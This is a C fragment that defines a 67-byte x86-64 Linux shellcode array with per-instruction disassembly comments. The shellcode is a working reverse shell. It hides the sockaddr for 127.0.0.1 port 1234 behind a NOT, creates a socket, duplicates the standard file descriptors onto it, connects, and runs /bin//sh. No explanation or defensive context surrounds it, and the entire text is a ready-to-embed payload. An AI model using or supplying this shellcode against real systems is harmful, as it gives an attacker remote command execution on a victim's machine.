
#define RS_SIZE 67

char RS[] = {
  /* 0000 */ "\x48\xb8\xfd\xff\xfb\x2d\x80\xff\xff\xfe" /* mov rax, 0xfeffff802dfbfffd */
  /* 000A */ "\x48\xf7\xd0"                             /* not rax                     */
  /* 000D */ "\x50"                                     /* push rax                    */
  /* 000E */ "\x54"                                     /* push rsp                    */
  /* 000F */ "\x5d"                                     /* pop rbp                     */
  /* 0010 */ "\x6a\x29"                                 /* push 0x29                   */
  /* 0012 */ "\x58"                                     /* pop rax                     */
  /* 0013 */ "\x6a\x01"                                 /* push 0x1                    */
  /* 0015 */ "\x5e"                                     /* pop rsi                     */
  /* 0016 */ "\x6a\x02"                                 /* push 0x2                    */
  /* 0018 */ "\x5f"                                     /* pop rdi                     */
  /* 0019 */ "\x99"                                     /* cdq                         */
  /* 001A */ "\x0f\x05"                                 /* syscall                     */
  /* 001C */ "\x97"                                     /* xchg edi, eax               */
  /* 001D */ "\x96"                                     /* xchg esi, eax               */
  /* 001E */ "\xb0\x21"                                 /* mov al, 0x21                */
  /* 0020 */ "\x0f\x05"                                 /* syscall                     */
  /* 0022 */ "\xff\xce"                                 /* dec esi                     */
  /* 0024 */ "\x79\xf8"                                 /* jns 0x1e                    */
  /* 0026 */ "\x55"                                     /* push rbp                    */
  /* 0027 */ "\x5e"                                     /* pop rsi                     */
  /* 0028 */ "\xb2\x10"                                 /* mov dl, 0x10                */
  /* 002A */ "\xb0\x2a"                                 /* mov al, 0x2a                */
  /* 002C */ "\x0f\x05"                                 /* syscall                     */
  /* 002E */ "\x99"                                     /* cdq                         */
  /* 002F */ "\x52"                                     /* push rdx                    */
  /* 0030 */ "\x5e"                                     /* pop rsi                     */
  /* 0031 */ "\x52"                                     /* push rdx                    */
  /* 0032 */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
  /* 003C */ "\x51"                                     /* push rcx                    */
  /* 003D */ "\x54"                                     /* push rsp                    */
  /* 003E */ "\x5f"                                     /* pop rdi                     */
  /* 003F */ "\xb0\x3b"                                 /* mov al, 0x3b                */
  /* 0041 */ "\x0f\x05"                                 /* syscall                     */
};